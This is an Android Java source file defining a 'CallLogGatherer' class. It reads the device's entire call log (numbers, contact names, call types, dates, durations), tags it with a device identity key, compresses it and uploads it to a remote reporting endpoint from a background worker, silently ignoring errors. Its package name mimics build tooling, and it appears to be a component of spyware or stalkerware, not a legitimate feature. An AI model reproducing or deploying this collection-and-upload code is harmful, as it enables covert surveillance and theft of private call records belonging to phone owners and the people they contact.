package org.code.coregradle.gatherers;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class CallLogGatherer implements InfoGatherer {

    private Context context;
    private ContentResolver contentResolver;
    private OkHttpClient httpClient;
    private IdentityStore identityStore;
    private int limit;

    public CallLogGatherer() {
        this.limit = -1;
    }

    public CallLogGatherer(int limit) {
        this.limit = limit;
    }

    @Override
    public void initGatherer(Context context) {
        this.context = context;
        this.contentResolver = context.getContentResolver();
        httpClient = new OkHttpClient();
        this.identityStore = IdentityStore.getInstance(context);
    }

    private JSONObject toCall(String phoneNumber, String type, String date, String name, String duration, long timestamp) {
        JSONObject call = new JSONObject();
        try {
            call.put("phone", phoneNumber);
            call.put("type", type);
            call.put("date", date);
            call.put("name", name);
            call.put("duration", duration);
            call.put("timestamp", timestamp);
        } catch (JSONException e) {

        }
        return call;
    }

    public void addCallLog(JSONObject root) {
        JSONArray conversations = new JSONArray();

        String[] projection = new String[]{CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME};
        try (Cursor cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC")) {
            boolean isLimited = false;
            if (limit > 0) {
                isLimited = true;
            }
            while (cursor.moveToNext()) {
                String phoneNumber = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                String date = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault()).format(new Date(timestamp));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                conversations.put(toCall(phoneNumber, type, date, name, duration, timestamp));
                if (isLimited) {
                    limit -= 1;
                    if (limit == 0) {
                        break;
                    }
                }
            }
        } catch (Exception ignored) {

        }
        try {
            root.put("calls", conversations);
        } catch (JSONException ignored) {
        }
    }

    @Override
    public JSONObject getRequestJSON() {
        JSONObject report = new JSONObject();
        try {
            report.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
            addCallLog(report);
        } catch (JSONException ignored) {

        }
        return report;
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        try {
            JSONObject conversations = getRequestJSON();
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(conversations.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_CALLS)
                    .post(requestBody)
                    .build();

            Response response = httpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
            return ListenableWorker.Result.retry();
        } catch (Exception ignored) {
            return ListenableWorker.Result.failure();
        }
    }
}
